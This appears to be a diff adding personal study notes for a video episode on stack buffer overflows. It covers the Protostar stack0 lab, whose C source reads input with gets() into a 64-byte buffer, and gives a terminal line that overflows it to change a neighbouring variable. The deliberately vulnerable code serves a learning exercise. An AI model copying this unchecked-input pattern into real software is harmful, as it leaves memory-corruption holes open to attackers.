@@ -1,0 +1,42 @@
+Episode 0x0C
+First Stack Buffer Overlow to modify Variable
+
+Stack layout
+local variables on the Stack
+buffer overflow to overwrite memory
+
+Prerequisites:
+  Assembler;
+  Debugging with dgb;
+
+Stack0 Source code : C
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+  volatile int modified;
+  char buffer[64];
+
+  modified = 0;
+  gets(buffer);
+
+  if(modified != 0) {
+      printf("you have changed the 'modified' variable\n");
+  } else {
+      printf("Try again?\n");
+  }
+}
+```
+
+End Result from terminal:
+  user@protostar:/opt/protostar/bin$ echo ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789LUL | ./stack0
+  you have changed the 'modified' variable
+
+End Result from GDB:
+  Files insid of ./0x0C/gdb/*
+
+
+TODO: Write notes on |https://www.youtube.com/watch?v=T03idxny9jE&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=13|
